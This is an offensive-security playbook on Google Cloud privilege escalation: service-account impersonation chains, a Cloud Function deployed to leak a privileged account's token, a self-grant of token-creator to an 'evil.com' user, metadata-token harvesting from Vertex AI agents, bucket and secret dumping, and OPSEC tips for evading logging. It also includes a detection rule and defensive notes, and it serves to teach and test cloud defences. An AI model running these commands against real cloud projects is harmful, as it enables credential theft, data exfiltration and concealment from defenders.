# GCP Attack Paths — Impersonation Chains, Cloud Functions, Vertex AI

CWE-269 (Improper Privilege Management), CWE-732 (Incorrect Permission Assignment), CWE-668.
ATT&CK: T1078.004 (Cloud Accounts), T1528 (Steal Application Access Token),
T1098.001, T1548, T1552.005.

## Theory / Mechanism

GCP IAM binds **principals** (users, groups, service accounts) to **roles** on **resources**.
The central escalation lever is `iam.serviceAccounts.actAs` — the GCP equivalent of AWS
`iam:PassRole`. With `actAs` on a privileged service account plus permission to create a compute
resource (GCE/Cloud Run/Cloud Function), you attach that SA to a resource you control and read its
credentials from the metadata server — inheriting all its permissions. Token-creator roles
(`roles/iam.serviceAccountTokenCreator`) let you mint tokens directly and can be **chained**:
A → impersonates B → impersonates C → org-level admin. The individual edges look benign; the danger
is in the graph, so you must enumerate the full impersonation graph, not review bindings in isolation.

## 1. actAs + resource create → SA credential theft

```bash
# Find SAs you can actAs (impersonate) and what they can do
gcloud iam service-accounts list --project TARGET
for SA in $(gcloud iam service-accounts list --project TARGET --format='value(email)'); do
  gcloud iam service-accounts get-iam-policy "$SA" --format=json \
    | jq -r --arg me "$(gcloud config get-value account)" \
      '.bindings[]? | select(.members[]? | contains($me)) | .role'
done

# Build the full impersonation graph automatically:
python3 ../scripts/gcp_impersonation_mapper.py --project TARGET --out gcp_graph.json

# Exploit: deploy a Cloud Function running as a privileged SA, then read its token
gcloud functions deploy esc --runtime python312 --trigger-http --allow-unauthenticated \
  --region us-central1 --service-account PRIVILEGED_SA@TARGET.iam.gserviceaccount.com \
  --entry-point handler --source ./fn
# fn/main.py:
#   import requests
#   def handler(request):
#       h = {"Metadata-Flavor": "Google"}
#       u = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
#       return requests.get(u, headers=h).text
curl https://us-central1-TARGET.cloudfunctions.net/esc   # -> access_token of the privileged SA
```

## 2. Direct token impersonation + IAM-policy self-grant

```bash
# If you hold roles/iam.serviceAccountTokenCreator on TARGET_SA, just mint a token:
gcloud auth print-access-token --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com
# Or short-lived token via API:
gcloud iam service-accounts add-iam-policy-binding TARGET_SA@PROJECT.iam.gserviceaccount.com \
  --member="user:you@evil.com" --role="roles/iam.serviceAccountTokenCreator"   # self-grant if allowed

# Generate an access token as the target SA (then use it):
ACCESS=$(curl -s -X POST \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA@PROJECT.iam.gserviceaccount.com:generateAccessToken" \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' | jq -r .accessToken)

# Other high-value primitives:
#  iam.serviceAccountKeys.create     -> mint a long-lived JSON key for any SA
#  compute.instances.setMetadata     -> push an SSH key to any VM (then SSH in)
#  deploymentmanager.deployments.create -> deploy as the project's editor SA
```

## 3. Modern 2024-2026: Vertex AI escalation

### ModeLeak (Unit 42, Nov 2024) — fixed by Google

Two issues in Vertex AI: the **AI Platform Custom Code Service Agent** could list all SAs and
read/write all storage buckets; and a **malicious custom model deployment** could access every
fine-tuned model in the project's Cloud Storage (model exfiltration). Google has since fixed these
specific issues.

### Ray on Vertex AI / "Viewer" escalation (XM Cyber, Jan 2026) — still default

A user with only the read-only `aiplatform.persistentResources.list` / `.get` perms (the standard
**Vertex AI Viewer** role) can use the console's "Head node interactive shell" link to obtain a
**root shell** on the Ray cluster head node. The node's attached token, while IAM-limited, grants
full control over Storage, BigQuery, Pub/Sub plus read across the project. Google deemed this
"working as intended" — it remains exploitable today.

### Double Agents / P4SA (Unit 42, disclosed 2026-03-31)

Vertex AI **Agent Engine** deployments get a default **Per-Project Per-Product Service Agent
(P4SA)** that is over-scoped. Any code path in a deployed agent can query the standard metadata
service and harvest the P4SA credentials (no novel exploit — just the metadata endpoint), then
pivot from the agent's execution context into the customer project: read **all** GCS buckets,
access private container registries, move laterally.

```bash
# From inside a Vertex AI Agent / Ray head-node / Workbench, the agent identity's token:
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Then with that token (P4SA / over-scoped SA): list every bucket in the project
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=TARGET" | jq -r '.items[].name'
```

Mitigation Google recommends: **Bring Your Own Service Account (BYOSA)** to replace the default
service agent and enforce least privilege.

## Post-exploitation

```bash
gsutil ls                                      # enumerate buckets you can reach
gsutil cp gs://target-bucket/secret.txt .
gcloud secrets list && gcloud secrets versions access latest --secret=NAME
# Firebase / open GCS from recon:
curl -s "https://PROJECT.firebaseio.com/.json"
```

## Detection

```yaml
title: GCP Service Account Impersonation Token Generation
id: e9c2f7a1-gcp-impersonation
status: experimental
logsource:
  product: gcp
  service: audit
detection:
  selection:
    methodName:
      - 'GenerateAccessToken'
      - 'google.iam.credentials.v1.IAMCredentials.GenerateAccessToken'
      - 'GenerateIdToken'
      - 'SignJwt'
  condition: selection
level: medium
falsepositives: [CI/CD and Workload Identity Federation that legitimately impersonate]
```

- Requires **Data Access audit logs** (`DATA_READ`) enabled for the project to capture
  `GenerateAccessToken`. Without it, impersonation is invisible.
- Alert on impersonation performed by a principal that has **no documented chain** to the target SA;
  on `serviceAccountKeys.create` (long-lived key minting); on `compute.instances.setMetadata`
  adding SSH keys; on new Cloud Functions / Cloud Run deployed with a privileged SA.

IOCs: `iam.serviceAccountKeys.create` for SAs that never rotate keys; `setMetadata` SSH-key pushes;
metadata-token reads from Vertex AI agents/Ray nodes feeding GCS list/read of all buckets.

## OPSEC

- `generateAccessToken` is logged **only if Data Access logging is on** — common gap; still assume
  it may be enabled.
- Prefer short-lived `generateAccessToken` over `serviceAccountKeys.create` — a created key is a
  durable, high-signal artifact that survives and is easy to alert on; delete keys you create.
- Cloud Function/Run deployment is logged (`google.cloud.functions...CreateFunction`); name and
  tear down deployed escalation resources.
- Vertex AI metadata-token harvesting is "by design" traffic to the metadata server — quiet — but
  bulk GCS enumeration afterward is the loud part; scope it.

## References

- Praetorian, "GCP Service Account-based Privilege Escalation paths" — https://www.praetorian.com/blog/google-cloud-platform-gcp-service-account-based-privilege-escalation-paths/
- HackTricks Cloud, "GCP - IAM Privesc" — https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-iam-privesc
- Unit 42, "ModeLeak: Privilege Escalation to LLM Model Exfiltration in Vertex AI" — https://unit42.paloaltonetworks.com/privilege-escalation-llm-model-exfil-vertex-ai/
- Unit 42, "Double Agents: Exposing Security Blind Spots in GCP Vertex AI" — https://unit42.paloaltonetworks.com/double-agents-vertex-ai/
- The Hacker News, "Vertex AI Vulnerability Exposes Google Cloud Data and Private Artifacts" (2026-03) — https://thehackernews.com/2026/03/vertex-ai-vulnerability-exposes-google.html
- Stratus Red Team, "Impersonate GCP Service Accounts" — https://stratus-red-team.cloud/attack-techniques/GCP/gcp.privilege-escalation.impersonate-service-accounts/
